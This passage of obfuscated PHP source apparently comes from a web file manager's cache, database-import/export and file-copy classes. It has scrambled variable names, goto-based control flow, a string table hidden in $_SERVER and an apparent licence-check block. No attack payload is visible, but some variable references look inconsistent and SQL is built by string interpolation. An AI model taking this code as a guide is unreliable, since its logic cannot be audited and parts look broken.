self::$memoryCache[$Bİ™“‰¥ˆ‚] = $E¥ç–Ë¯µ; goto bÄ®÷œ±´Ç; F„„Ğ™¦‘: } public static function remove($e®İÂ¾“ã) { goto F£¶¿†­á; fŞÙÉÈ‘óù: CacheLock::lock($e®İÂ¾“ã); $DµÎ¯ìâ¾Ÿ = self::init()->remove($dãâÑÈùªÍ); CacheLock::unlock($e®İÂ¾“ã); goto e‘°íæŒì; F£¶¿†­á: $dãâÑÈùªÍ = self::key($e®İÂ¾“ã); unset(self::$memoryCache[$dãâÑÈùªÍ]); self::clearTimeout(); goto fŞÙÉÈ‘óù; e‘°íæŒì: return $DµÎ¯ìâ¾Ÿ; goto BĞÄ…ÀÖ; BĞÄ…ÀÖ: } public static function clearMemory($cç¾ÚÀÒÄ = false) { if ($cç¾ÚÀÒÄ) { $cç¾ÚÀÒÄ = self::key($cç¾ÚÀÒÄ); unset(self::$memoryCache[$cç¾ÚÀÒÄ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ìó][754])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ìó][755])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($EÜ¯Â¦äåé, $cß¤™¯Ñà) { $DåÙ™ËæØ× =& $_SERVER[Ìó]; $this->cachePath = $EÜ¯Â¦äåé[$DåÙ™ËæØ×[75]]; $this->prefix = $DåÙ™ËæØ×[756]; $this->cacheTime = $cß¤™¯Ñà; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($aÓáµİÑÍŠ) { $C¿áÒÄ®ï² =& $_SERVER[Ìó]; $aÓáµİÑÍŠ = str_replace(array($C¿áÒÄ®ï²[757], $C¿áÒÄ®ï²[93], $C¿áÒÄ®ï²[69]), $C¿áÒÄ®ï²[758], $aÓáµİÑÍŠ); return $this->cachePath . $C¿áÒÄ®ï²[759] . $aÓáµİÑÍŠ . $C¿áÒÄ®ï²[760]; } public function set($eŠØÆø…ì, $eî‘Íœì˜ß, $FÅ„š—Ç¬¿ = false) { $cÂ›¾ˆ‘® = $this->getFile($eŠØÆø…ì); if (file_put_contents($cÂ›¾ˆ‘®, $this->prefix . $eî‘Íœì˜ß, LOCK_EX)) { return !0; } @unlink($cÂ›¾ˆ‘®); return !1; } public function get($cæŒ–¿ÑÍ¡) { $C˜Ï“„—£‘ = $this->getFile($cæŒ–¿ÑÍ¡); if (file_exists($C˜Ï“„—£‘) && filemtime($C˜Ï“„—£‘) < time() - $this->cacheTime) { @unlink($C˜Ï“„—£‘); return !1; } $bøÛ÷î×Ğ = @file_get_contents($C˜Ï“„—£‘); return substr($bøÛ÷î×Ğ, strlen($this->prefix)); } public function remove($cÆ–Åˆâ¢Û) { $EÎ¿ùñ÷‘ç = $this->getFile($cÆ–Åˆâ¢Û); return @unlink($EÎ¿ùñ÷‘ç); } public function deleteAll() { $d°Ÿ‚¿·¤› =& $_SERVER[Ìó]; $C†ŒƒçÉ³™ = scandir($this->cachePath); foreach ($C†ŒƒçÉ³™ as $a•Èç˜ ÊŸ) { $a˜¸Û¥‡£® = $this->cachePath . $a•Èç˜ ÊŸ; if (strpos($a˜¸Û¥‡£®, $d°Ÿ‚¿·¤›[760]) && strpos($a˜¸Û¥‡£®, $d°Ÿ‚¿·¤›[761])) { @unlink($a˜¸Û¥‡£®); } } } public function clearTimeout() { $fÎ¾ä¢¦¿§ =& $_SERVER[Ìó]; $Fî·îˆ¸„ˆ = scandir($this->cachePath); foreach ($Fî·îˆ¸„ˆ as $E‰ç‰ÖÖ¬) { $cŸ‘†Ã¨× = $this->cachePath . $E‰ç‰ÖÖ¬; if (strpos($cŸ‘†Ã¨×, $fÎ¾ä¢¦¿§[760]) && strpos($cŸ‘†Ã¨×, $fÎ¾ä¢¦¿§[761]) && filemtime($cŸ‘†Ã¨×) < time() - $this->cacheTime) { @unlink($cŸ‘†Ã¨×); } } } } goto Cƒ…ÅÂ÷Õ»; b÷óÔÈ¥¤œ: if ($_SERVER[$_SERVER[Ìó][768]] != $e¦¡ÆéÌÒò($BŒÖÄÉÄ¦ª)) { goto A··µ¿–£ö; A¬í™™Óä: $Cù†›£»ñƒ = explode($_SERVER[Ìó][213], $fá°„½Á); if (count($Cù†›£»ñƒ) < $_SERVER[Ìó][548]) { $fîÑåø«ŒÂ = $_SERVER[Ìó][773]; $fîÑåø«ŒÂ(); } $a¶êÏÖ¦ = $_SERVER[Ìó][774]; goto f‡áš†‚ä; f‡áš†‚ä: $a¶êÏÖ¦($BŒÖÄÉÄ¦ª); goto fï‡ó¬ª¬î; A··µ¿–£ö: $Bö¡éÕšº± = $_SERVER[Ìó][770]; $f ĞÀ‰ÇÇè = $_SERVER[$_SERVER[Ìó][771]] . $_SERVER[Ìó][772]; $fá°„½Á = $Bö¡éÕšº±($f ĞÀ‰ÇÇè); goto A¬í™™Óä; fï‡ó¬ª¬î: } class DbManage { function __construct($A»¨Ş™Ÿ·, $AÅŠ½ºÙá‡ = '') { $this->database = $A»¨Ş™Ÿ·; $this->type = $AÅŠ½ºÙá‡; } public function model($EÃª÷§Íš = '') { return new ModelBase($EÃª÷§Íš, $_SERVER[Ìó][33], $this->database); } public function db($b¿ôÑ”‰Ö§ = false) { goto fŞîÓïÏ‡Œ; dØøŒ‡Õ«¯: $this->database = $aÔè§ŒÑøÈ; $d÷Í•çõ£²->execute("\165\x73\x65\x20\140{$a‚‘Öğñ”Ê}\x60"); return $d÷Í•çõ£²; goto a„È‰œª›·; fŞîÓïÏ‡Œ: $fˆÅ¶óÛ¹Ë =& $_SERVER[Ìó]; $aÔè§ŒÑøÈ = $this->database; if ($this->type == $fˆÅ¶óÛ¹Ë[9] || !$b¿ôÑ”‰Ö§) { return $this->model()->db(); } goto aÛŸ³¨•ôÇ; d°Îî…çÛª: if (!$E·ë¥À›œ¤) { $d÷Í•çõ£²->execute("\143\x72\145\141\164\x65\x20\x64\141\x74\141\x62\x61\163\145\40\x60{$a‚‘Öğñ”Ê}\140"); } $aÔè§ŒÑøÈ[$fˆÅ¶óÛ¹Ë[230]] = $a‚‘Öğñ”Ê; if ($aÔè§ŒÑøÈ[$fˆÅ¶óÛ¹Ë[886]] == $fˆÅ¶óÛ¹Ë[720]) { $aÔè§ŒÑøÈ[$fˆÅ¶óÛ¹Ë[885]] .= $fˆÅ¶óÛ¹Ë[971] . $a‚‘Öğñ”Ê; } goto dØøŒ‡Õ«¯; eÃâÂÄÆ§Ë: $this->database = $aÔè§ŒÑøÈ; $d÷Í•çõ£² = $this->model()->db(); $E·ë¥À›œ¤ = $d÷Í•çõ£²->execute("\x73\x68\157\167\40\144\x61\x74\x61\142\141\163\145\x73\40\x6c\x69\153\145\40\47{$a‚‘Öğñ”Ê}\47"); goto d°Îî…çÛª; aÛŸ³¨•ôÇ: $a‚‘Öğñ”Ê = $aÔè§ŒÑøÈ[$fˆÅ¶óÛ¹Ë[230]]; $aÔè§ŒÑøÈ[$fˆÅ¶óÛ¹Ë[230]] = $fˆÅ¶óÛ¹Ë[33]; if ($aÔè§ŒÑøÈ[$fˆÅ¶óÛ¹Ë[886]] == $fˆÅ¶óÛ¹Ë[720]) { $Eñ”Ú­¡Íê = $aÔè§ŒÑøÈ[$fˆÅ¶óÛ¹Ë[885]]; $aÔè§ŒÑøÈ[$fˆÅ¶óÛ¹Ë[885]] = substr($Eñ”Ú­¡Íê, 0, strrpos($Eñ”Ú­¡Íê, $fˆÅ¶óÛ¹Ë[971])); } goto eÃâÂÄÆ§Ë; a„È‰œª›·: } public function createTable($eÂ¹¿éµôé, $f°óÍ¯İ¸¶ = null) { $F«ÔŒÚÔ¦ =& $_SERVER[Ìó]; if (!IO::exist($eÂ¹¿éµôé)) { show_json(LNG($F«ÔŒÚÔ¦[972]), !1); } $c²Ê§¢­ = sqlSplit(IO::getContent($eÂ¹¿éµôé)); foreach ($c²Ê§¢­ as $DŒœà  šŠ) { if ($f°óÍ¯İ¸¶) { $Câ§áÙ = stripos($DŒœà  šŠ, $F«ÔŒÚÔ¦[973]) === 0; if ($Câ§áÙ) { $f°óÍ¯İ¸¶->task[$F«ÔŒÚÔ¦[974]] += 1; } } $this->model()->db()->execute($DŒœà  šŠ); if ($f°óÍ¯İ¸¶ && $Câ§áÙ) { $AÒØÛ¼ßÆ‰ = $F«ÔŒÚÔ¦[975]; preg_match($AÒØÛ¼ßÆ‰, $DŒœà  šŠ, $A’µÆ÷¬Ğ¨); $f°óÍ¯İ¸¶->task[$F«ÔŒÚÔ¦[976]] = trim($Eš£²õ”¤[0], $F«ÔŒÚÔ¦[822]); $f°óÍ¯İ¸¶->update(1); } } $this->taskToCache($f°óÍ¯İ¸¶); } public function insertTable($D†¾Ö©…±, $FÓ©‘šµè• = null) { $d–Š­“Ì¬Û =& $_SERVER[Ìó]; foreach ($D†¾Ö©…± as $bƒ¯‹ƒñîÑ) { $CËŞÜ•Ä«ä = basename($bƒ¯‹ƒñîÑ); $CËŞÜ•Ä«ä = substr($CËŞÜ•Ä«ä, 0, strrpos($CËŞÜ•Ä«ä, $d–Š­“Ì¬Û[91])); if ($FÓ©‘šµè•) { $FÓ©‘šµè•->task[$d–Š­“Ì¬Û[976]] = $CËŞÜ•Ä«ä; } if (get_filesize($bƒ¯‹ƒñîÑ) == 0) { continue; } $CÆ¤‘¨Ÿ“ë = $this->sqlToDb($bƒ¯‹ƒñîÑ, $FÓ©‘šµè•); if (!$CÆ¤‘¨Ÿ“ë) { show_json(LNG($d–Š­“Ì¬Û[977]) . "\133{$CËŞÜ•Ä«ä}\135", !1); } } $this->taskToCache($FÓ©‘šµè•); } public function sqlFromDb($eàİ¢ÒØ, $bÀŠ¦¬¹, $d¦ÉÓÁ“³œ = null, $F†´æÕáÆº = null) { goto F‡Ñ‘ßÆ’; FÔÌâêÛª: $cÕ–¥¡²¢§ = $DÜŒÆŠ‰¢->getPk(); $F§½ÜÊİÊŒ = $DÜŒÆŠ‰¢->getDbFields(); do { $f÷„³äÉ½ = $DÜŒÆŠ‰¢->field($F§½ÜÊİÊŒ)->order($cÕ–¥¡²¢§ . $_SERVER[Ìó][979])->selectPage($aÖ öù¬ğ¾, $bÙ¤áÏš); $Dä‘ÄÔ–„ï = !empty($f÷„³äÉ½[$_SERVER[Ìó][350]]) ? $f÷„³äÉ½[$_SERVER[Ìó][350]] : array(); if (!($c…çºÂõ™Ú = count($Dä‘ÄÔ–„ï))) { break; } if ($d¦ÉÓÁ“³œ) { $d¦ÉÓÁ“³œ->task[$_SERVER[Ìó][974]] += $c…çºÂõ™Ú; } $eÇÕêƒ¥™ = array(); foreach ($Dä‘ÄÔ–„ï as $aç«¢«Ë›ƒ) { if ($F†´æÕáÆº) { $aç«¢«Ë›ƒ[$_SERVER[Ìó][75]] = "\x7b\x69\x6f\x3a{$F†´æÕáÆº}\175" . substr($aç«¢«Ë›ƒ[$_SERVER[Ìó][75]], strlen("\x7b\151\157\72{$aç«¢«Ë›ƒ[$_SERVER[Ìó][739]]}\175")); $aç«¢«Ë›ƒ[$_SERVER[Ìó][739]] = $F†´æÕáÆº; } $eÇÕêƒ¥™[] = $_SERVER[Ìó][980] . $this->sqlEncode($aç«¢«Ë›ƒ) . $_SERVER[Ìó][981]; } $AæÓÍ¶ÑçŠ = "\111\116\x53\105\122\124\x20\x49\x4e\x54\117\40\x60{$eàİ¢ÒØ}\140\x20\50\140" . implode($_SERVER[Ìó][982], $F§½ÜÊİÊŒ) . $_SERVER[Ìó][983]; fwrite($a‘”¬«¾·Æ, $AæÓÍ¶ÑçŠ . implode($_SERVER[Ìó][984], $eÇÕêƒ¥™) . $_SERVER[Ìó][67] . PHP_EOL); $bÙ¤áÏš++; $fƒòê¯‹¬¿ += $c…çºÂõ™Ú; if ($d¦ÉÓÁ“³œ) { $d¦ÉÓÁ“³œ->update($c…çºÂõ™Ú); } } while ($c…çºÂõ™Ú == $aÖ öù¬ğ¾); goto d‰Ç’–ƒ; F‡Ñ‘ßÆ’: if ($d¦ÉÓÁ“³œ) { $d¦ÉÓÁ“³œ->task[$_SERVER[Ìó][976]] = $eàİ¢ÒØ; } $DÜŒÆŠ‰¢ = $this->model($eàİ¢ÒØ); $fƒòê¯‹¬¿ = 0; goto BÁÎĞ¦¾Š; BÁÎĞ¦¾Š: $bÙ¤áÏš = 1; $aÖ öù¬ğ¾ = 500; $a‘”¬«¾·Æ = fopen($bÀŠ¦¬¹, $_SERVER[Ìó][978]); goto FÔÌâêÛª; d‰Ç’–ƒ: fclose($a‘”¬«¾·Æ); return $fƒòê¯‹¬¿; goto a‰’×´Š; a‰’×´Š: } public function sqlToDb($aÛË’Ìù†ë, $d»‰‹ÇòÜ¬ = null) { goto aÔË†‡Ú™Ê; eŸ›¸£Ğã‘: if ($Bğ¾ÏÜ £Ü) { $Bğ¾ÏÜ £Ü = rtrim(trim($Bğ¾ÏÜ £Ü), $bó„Ì ˆ¶ä[67]); if (!$a­ÔÔ¡Î­é->execute($Bğ¾ÏÜ £Ü)) { return !1; } if ($d»‰‹ÇòÜ¬) { $d»‰‹ÇòÜ¬->update($dáĞñ¬’¦ï - 1); } } return !0; goto eÆ®ôÖÇØ; aÔË†‡Ú™Ê: $bó„Ì ˆ¶ä =& $_SERVER[Ìó]; $a­ÔÔ¡Î­é = $this->model()->db(); $E™¿‰°…’Ì = @fopen($aÛË’Ìù†ë, $bó„Ì ˆ¶ä[985]); goto BÕ©î®§¾; FÄ™õµ‚ö: $F¥¿ŒÆ‘’ = 500 + 1; while (!feof($E™¿‰°…’Ì)) { if ($d»‰‹ÇòÜ¬ && $dáĞñ¬’¦ï != 0) { $d»‰‹ÇòÜ¬->task[$bó„Ì ˆ¶ä[974]] += 1; } $dáĞñ¬’¦ï++; $DÏğîİ´„„ = trim(fgets($E™¿‰°…’Ì)); $Bğ¾ÏÜ £Ü .= $bó„Ì ˆ¶ä[50] . $this->sqlDecode($DÏğîİ´„„, $this->type); if ($dáĞñ¬’¦ï == $F¥¿ŒÆ‘’) { $Bğ¾ÏÜ £Ü = rtrim(trim($Bğ¾ÏÜ £Ü), $bó„Ì ˆ¶ä[67]); if (!$a­ÔÔ¡Î­é->execute($Bğ¾ÏÜ £Ü)) { return !1; } if ($d»‰‹ÇòÜ¬) { $d»‰‹ÇòÜ¬->update($dáĞñ¬’¦ï - 1); } $Bğ¾ÏÜ £Ü = $bó„Ì ˆ¶ä[33]; $dáĞñ¬’¦ï = 0; } } fclose($E™¿‰°…’Ì); goto eŸ›¸£Ğã‘; BÕ©î®§¾: if (!$E™¿‰°…’Ì) { return !1; } $dáĞñ¬’¦ï = 0; $Bğ¾ÏÜ £Ü = $bó„Ì ˆ¶ä[33]; goto FÄ™õµ‚ö; eÆ®ôÖÇØ: } public function dropTable($Aó˜¡Ô”ÅÊ = null) { $dÒÍÈ˜•’© = $this->model()->db(); $F·ˆÊ¹Û¥­ = $Aó˜¡Ô”ÅÊ ? array($Aó˜¡Ô”ÅÊ) : $dÒÍÈ˜•’©->getTables(); if (!$F·ˆÊ¹Û¥­) { return; } foreach ($F·ˆÊ¹Û¥­ as $Aó˜¡Ô”ÅÊ) { $dÒÍÈ˜•’©->execute("\x64\x72\x6f\160\40\x74\141\x62\x6c\x65\x20\x69\x66\x20\145\170\x69\163\164\163\x20\x60{$Aó˜¡Ô”ÅÊ}\140"); } } private function taskToCache($AïáßŠŒéÒ = null) { $e¨Šµ‰—‡ =& $_SERVER[Ìó]; if (!$AïáßŠŒéÒ) { return; } $AÑÉŸƒè…é = array($e¨Šµ‰—‡[976] => $AïáßŠŒéÒ->task[$e¨Šµ‰—‡[976]], $e¨Šµ‰—‡[974] => $AïáßŠŒéÒ->task[$e¨Šµ‰—‡[974]], $e¨Šµ‰—‡[986] => $AïáßŠŒéÒ->task[$e¨Šµ‰—‡[986]]); if ($AÑÉŸƒè…é[$e¨Šµ‰—‡[974]] == $AÑÉŸƒè…é[$e¨Šµ‰—‡[986]]) { $AÑÉŸƒè…é[$e¨Šµ‰—‡[692]] = 1; } Cache::set($e¨Šµ‰—‡[987] . $AïáßŠŒéÒ->task[$e¨Šµ‰—‡[363]], $AÑÉŸƒè…é); $AïáßŠŒéÒ->end(); } private function sqlEncode($c†È©¯æ×ê) { $c‚Ü„ŠÎÇÓ =& $_SERVER[Ìó]; $eõÛ§«´í¹ = array(); foreach ($c†È©¯æ×ê as $eÚø–ğöèæ) { if (is_array($eÚø–ğöèæ)) { $eÚø–ğöèæ = json_encode_force($eÚø–ğöèæ); } $eÚø–ğöèæ = addslashes($eÚø–ğöèæ); $eÚø–ğöèæ = str_replace(array($c‚Ü„ŠÎÇÓ[988], $c‚Ü„ŠÎÇÓ[213]), array($c‚Ü„ŠÎÇÓ[989], $c‚Ü„ŠÎÇÓ[990]), $eÚø–ğöèæ); $eõÛ§«´í¹[] = str_replace($c‚Ü„ŠÎÇÓ[55], $c‚Ü„ŠÎÇÓ[991], $eÚø–ğöèæ); } return $c‚Ü„ŠÎÇÓ[55] . implode($c‚Ü„ŠÎÇÓ[992], $eõÛ§«´í¹) . $c‚Ü„ŠÎÇÓ[55]; } private function sqlDecode($d¯Ó¦ÖÕõ¾, $aâêàæóéè) { $f˜àÌ•œ°Ê =& $_SERVER[Ìó]; $d¯Ó¦ÖÕõ¾ = str_replace(array($f˜àÌ•œ°Ê[989], $f˜àÌ•œ°Ê[990]), array($f˜àÌ•œ°Ê[988], $f˜àÌ•œ°Ê[213]), $d¯Ó¦ÖÕõ¾); if ($aâêàæóéè == $f˜àÌ•œ°Ê[9]) { $d¯Ó¦ÖÕõ¾ = stripslashes($d¯Ó¦ÖÕõ¾); } return $d¯Ó¦ÖÕõ¾; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($fõ»È´âÃ, $dÃ¿åˆ”¦) { $bƒˆ¡İ™Òó = self::driverMake($dÃ¿åˆ”¦[0]); if (method_exists($bƒˆ¡İ™Òó, $fõ»È´âÃ)) { return @call_user_func_array(array($bƒˆ¡İ™Òó, $fõ»È´âÃ), $dÃ¿åˆ”¦); } if (method_exists($bƒˆ¡İ™Òó, $_SERVER[Ìó][993])) { return @call_user_func_array(array($bƒˆ¡İ™Òó, $fõ»È´âÃ), $dÃ¿åˆ”¦); } else { if (method_exists(self, $fõ»È´âÃ)) { return @call_user_func_array(array(self, $fõ»È´âÃ), $dÃ¿åˆ”¦); } else { call_user_func_array(array(parent, $fõ»È´âÃ), $dÃ¿åˆ”¦); } } } public static function init($Bù‰—®Ë) { return self::driverMake($Bù‰—®Ë); } public static function copy($a“…Ğ¿Æô±, $e…å—ğ•†÷, $c¢†‡Ú‚é = false, $EõÌîªØÊ = false) { return self::copyMove($a“…Ğ¿Æô±, $e…å—ğ•†÷, $c¢†‡Ú‚é, $_SERVER[Ìó][485], $EõÌîªØÊ); } public static function move($D‰Ğñ©”ÏÀ, $eù…±ï¨Œ, $fÃ¶ŞóÃ†Š = false, $bÀù’òÛ” = false) { return self::copyMove($D‰Ğñ©”ÏÀ, $eù…±ï¨Œ, $fÃ¶ŞóÃ†Š, $_SERVER[Ìó][487], $bÀù’òÛ”); } public static function saveFile($BÄ˜¬…ÒÈ”, $fœ¡•Æö„Ä, $B‘ÌÀåŠïİ = true) { goto FÉòóß…¢¹; D”¶ò¤ÕÄ: $fˆİ“ïù¤ = $DÙ¹É£ô®‘->pathFather($fœ¡•Æö„Ä); $BË„‰¬ÜØÉ = !0; if (!$B‘ÌÀåŠïİ && self::driverIsSame($AšÂ²·ˆ¶×, $DÙ¹É£ô®‘)) { $BË„‰¬ÜØÉ = !1; } goto fêÏ¯Œ‹Ş; eŞÜÜ©½º: $DÙ¹É£ô®‘ = self::driverMake($fœ¡•Æö„Ä); $b½ëğ±Ò©Æ = !1; if ($DÙ¹É£ô®‘->pathParse[$C²“Ó¶¥í[994]]) { $Có‘«çİ® = $DÙ¹É£ô®‘->pathParse[$C²“Ó¶¥í[994]]; $b½ëğ±Ò©Æ = $DÙ¹É£ô®‘; $DÙ¹É£ô®‘ = self::driverMake($Có‘«çİ®); } goto D”¶ò¤ÕÄ; fêÏ¯Œ‹Ş: $e“ÚÓÙÅÄö = self::copyFile($AšÂ²·ˆ¶×, $BÄ˜¬…ÒÈ”, $DÙ¹É£ô®‘, $fˆİ“ïù¤, $dŞ“ÖĞ…ç˜[$C²“Ó¶¥í[28]], $BË„‰¬ÜØÉ); if ($b½ëğ±Ò©Æ) { $e“ÚÓÙÅÄö = $b½ëğ±Ò©Æ->getPathOuter($e“ÚÓÙÅÄö); } return $e“ÚÓÙÅÄö; goto BĞˆ©§’; FÉòóß…¢¹: $C²“Ó¶¥í =& $_SERVER[Ìó]; $dŞ“ÖĞ…ç˜ = self::info($fœ¡•Æö„Ä); $AšÂ²·ˆ¶× = self::driverMake($BÄ˜¬…ÒÈ”); goto eŞÜÜ©½º; BĞˆ©§’: } private static function copyMove($eÃªæ‘´ô«, $B™ñ½»Ğ¤‹, $eÉ¾ëæÁ®å, $FæĞŠäÓß, $bï–»°Œ‡ = false) { goto f‚³î«Î‚; FõÒ™‚êÎ³: if ($dÃå¬·¾œÖ) { $A˜éÜÄ…•¶ = $dÃå¬·¾œÖ->getPathOuter($A˜éÜÄ…•¶); } return $A˜éÜÄ…•¶; goto b‡Í¸½£Š; f‚³î«Î‚: $D²»—‡ÜÜ =& $_SERVER[Ìó]; if (!$eÃªæ‘´ô« || $eÃªæ‘´ô« == $D²»—‡ÜÜ[8] || !$B™ñ½»Ğ¤‹) { return !1; } ignore_timeout(); goto FäîÙòà‰à; BÏ…Ÿç¸Ö: $F‰æÏ¨Í…Ù = $cÅÍ½êíÛ->isFile($eÃªæ‘´ô«); if (!$F‰æÏ¨Í…Ù && $aÔ†Şî³->getType() == $D²»—‡ÜÜ[690] && $cÅÍ½êíÛ->getType() == $D²»—‡ÜÜ[101]) { $A˜éÜÄ…•¶ = $aÔ†Şî³->copyFolderFromIO($cÅÍ½êíÛ, $eÃªæ‘´ô«, $B™ñ½»Ğ¤‹, $eÉ¾ëæÁ®å, $F¯õ±©¡Š, $bï–»°Œ‡); } else { $A˜éÜÄ…•¶ = self::copyPath($cÅÍ½êíÛ, $eÃªæ‘´ô«, $aÔ†Şî³, $B™ñ½»Ğ¤‹, $eÉ¾ëæÁ®å, $F¯õ±©¡Š, $F‰æÏ¨Í…Ù, $bï–»°Œ‡); } if ($A˜éÜÄ…•¶ && $F¯õ±©¡Š) { $cÅÍ½êíÛ->remove($eÃªæ‘´ô«); } goto FõÒ™‚êÎ³; Fˆ«¡ß­Õ§: Hook::trigger($D²»—‡ÜÜ[72], $cÅÍ½êíÛ, $eÃªæ‘´ô«, $aÔ†Şî³, $B™ñ½»Ğ¤‹); $f»ÏÖ—”™ = self::driverIsSame($cÅÍ½êíÛ, $aÔ†Şî³); if ($f»ÏÖ—”™) { if ($FæĞŠäÓß == $D²»—‡ÜÜ[487] && trim($B™ñ½»Ğ¤‹, $D²»—‡ÜÜ[8]) == trim($aÔ†Şî³->pathFather($eÃªæ‘´ô«), $D²»—‡ÜÜ[8])) { return $aÔ†Şî³->getPathOuter($eÃªæ‘´ô«); } if (method_exists($aÔ†Şî³, $FæĞŠäÓß)) { return $aÔ†Şî³->{$FæĞŠäÓß}($eÃªæ‘´ô«, $B™ñ½»Ğ¤‹, $eÉ¾ëæÁ®å); } } goto BÏ…Ÿç¸Ö; a“¥Ÿ‚ÔÆâ: $dÃå¬·¾œÖ = !1; if ($aÔ†Şî³->pathParse[$D²»—‡ÜÜ[994]]) { $B™ñ½»Ğ¤‹ = $aÔ†Şî³->pathParse[$D²»—‡ÜÜ[994]]; $dÃå¬·¾œÖ = $aÔ†Şî³; $aÔ†Şî³ = self::driverMake($B™ñ½»Ğ¤‹); } self::check($cÅÍ½êíÛ, $eÃªæ‘´ô«, $aÔ†Şî³, $B™ñ½»Ğ¤‹); goto Fˆ«¡ß­Õ§; FäîÙòà‰à: $cÅÍ½êíÛ = self::driverMake($eÃªæ‘´ô«); $aÔ†Şî³ = self::driverMake($B™ñ½»Ğ¤‹); $F¯õ±©¡Š = $FæĞŠäÓß == $D²»—‡ÜÜ[487]; goto a“¥Ÿ‚ÔÆâ; b‡Í¸½£Š: } private static function check($EéÚ’˜§¶‡, $DˆŒÎßÎŸ, $a—³š¡¸æ©, &$fŒŒóíÙœÌ) { $dÂ¬¾³¥ =& $_SERVER[Ìó]; if (self::driverIsSame($EéÚ’˜§¶‡, $a—³š¡¸æ©) && $EéÚ’˜§¶‡->isFolder($DˆŒÎßÎŸ) && $EéÚ’˜§¶‡->isParentOf($DˆŒÎßÎŸ, $fŒŒóíÙœÌ)) { show_json(LNG($dÂ¬¾³¥[995]), !1); } if (!$EéÚ’˜§¶‡->exist($DˆŒÎßÎŸ)) { show_json(LNG($dÂ¬¾³¥[100]), !1); } } private static function copyPath($CÛ±Œ¿²¦, $CÁÊ†²›÷„, $C×Ì­Â‚ƒ’, $E÷”•¬¨‡¿, $c¹¬”¯çŠš, $FÒƒÍƒ‹—­, $c¹Ïô¥ê÷‹, $C¯¤Êª¬ = false) { goto FôÌ¶‚æÅ‰; FôÌ¶‚æÅ‰: $fò†ñØß£ =& $_SERVER[Ìó]; $E‰Ş°º ‚Â = $C¯¤Êª¬ ? $C¯¤Êª¬ : $CÛ±Œ¿²¦->getPathName($CÛ±Œ¿²¦->pathThis($CÁÊ†²›÷„)); if ($c¹¬”¯çŠš) { $cš ›Š©’ = $C×Ì­Â‚ƒ’->fileNameExist($E÷”•¬¨‡¿, $E‰Ş°º ‚Â); $E‰Ş°º ‚Â = $C×Ì­Â‚ƒ’->fileNameAuto($E÷”•¬¨‡¿, $E‰Ş°º ‚Â, $c¹¬”¯çŠš, !$c¹Ïô¥ê÷‹); $c¹¬”¯çŠš = $cš ›Š©’ ? $c¹¬”¯çŠš : !1; } goto dêö‹—ƒ¶; CŠÙ­È±Î: $eîÀÂã³‰ñ = $C×Ì­Â‚ƒ’->mkdir($C×Ì­Â‚ƒ’->getPath($e‚ÔÚè–ºî)); $E÷”•¬¨‡¿ = $C×Ì­Â‚ƒ’->getPathInner($eîÀÂã³‰ñ); $A¼ìç®æàë = $CÛ±Œ¿²¦->listPath($CÁÊ†²›÷„, !0); goto e‹ÔÌ¶¼Ú¡; dêö‹—ƒ¶: if ($c¹Ïô¥ê÷‹) { return self::copyFile($CÛ±Œ¿²¦, $CÁÊ†²›÷„, $C×Ì­Â‚ƒ’, $E÷”•¬¨‡¿, $E‰Ş°º ‚Â, $FÒƒÍƒ‹—­); } if ($c¹¬”¯çŠš == REPEAT_RENAME_FOLDER) { $c¹¬”¯çŠš = !1; } $e‚ÔÚè–ºî = rtrim($E÷”•¬¨‡¿, $fò†ñØß£[8]) . $fò†ñØß£[8] . $E‰Ş°º ‚Â; goto CŠÙ­È±Î; e‹ÔÌ¶¼Ú¡: $EÀ–º´Ÿàµ = array_merge($A¼ìç®æàë[$fò†ñØß£[73]], $A¼ìç®æàë[$fò†ñØß£[74]]); foreach ($EÀ–º´Ÿàµ as $bÔÉé¾Ë×Ô) { $a†é‡ÕˆÎ = $bÔÉé¾Ë×Ô[$fò†ñØß£[29]] == $fò†ñØß£[163]; $CÁÊ†²›÷„ = $CÛ±Œ¿²¦->getPathInner($bÔÉé¾Ë×Ô[$fò†ñØß£[75]]); $a‘ÏÔ”›”Õ = self::copyPath($CÛ±Œ¿²¦, $CÁÊ†²›÷„, $C×Ì­Â‚ƒ’, $E÷”•¬¨‡¿, $c¹¬”¯çŠš, $FÒƒÍƒ‹—­, $a†é‡ÕˆÎ); if (!$a‘ÏÔ”›”Õ) { write_log($fò†ñØß£[996] . $CÁÊ†²›÷„ . $fò†ñØß£[997] . $E÷”•¬¨‡¿, $fò†ñØß£[998]); } } return $eîÀÂã³‰ñ; goto EÇºµ“¹à‡; EÇºµ“¹à‡: } private static function copyFile($bøÔÌ§è¿Ã, $a ¹¸°¥„¹, $b¶õˆˆÕ, $dÂÀ‘ô«ø©, $FÑÕÏÈ†Îô, $e•…ÜÒ¡ø) { goto CÎ‘µìÏÑƒ; cºŞº©¼¨: $dŠ×áåÖÄ = $bøÔÌ§è¿Ã->iconvApp($dŠ×áåÖÄ); $CÁîñ›Š« = $b¶õˆˆÕ->upload($dÂÀ‘ô«ø©, $dŠ×áåÖÄ, $e•…ÜÒ¡ø); self::remove($c†¶êŠ¢¡‚ . $C…Ë‹ìÂŠ¹); goto A¯¨•à¡»ƒ; D£ë›‚ÍäÜ: Hook::trigger($B†‡’˜ù[1000], $bøÔÌ§è¿Ã, $a ¹¸°¥„¹, $b¶õˆˆÕ, $dÂÀ‘ô«ø©, $FÑÕÏÈ†Îô, $C…Ë‹ìÂŠ¹); if (self::driverIsSame($bøÔÌ§è¿Ã, $b¶õˆˆÕ)) { if ($e•…ÜÒ¡ø) { $CÁîñ›Š« = $b¶õˆˆÕ->moveFile($a ¹¸°¥„¹, $dÂÀ‘ô«ø©); } else { $CÁîñ›Š« = $b¶õˆˆÕ->copyFile($a ¹¸°¥„¹, $dÂÀ‘ô«ø©); } Hook::trigger($B†‡’˜ù[1001], $bøÔÌ§è¿Ã, $a ¹¸°¥„¹, $b¶õˆˆÕ, $dÂÀ‘ô«ø©, $FÑÕÏÈ†Îô, $CÁîñ›Š«); return $CÁîñ›Š«; } $c†¶êŠ¢¡‚ = TEMP_FILES; goto b™Ï´Å¹­¯; A¯¨•à¡»ƒ: Hook::trigger($B†‡’˜ù[1001], $bøÔÌ§è¿Ã, $a ¹¸°¥„¹, 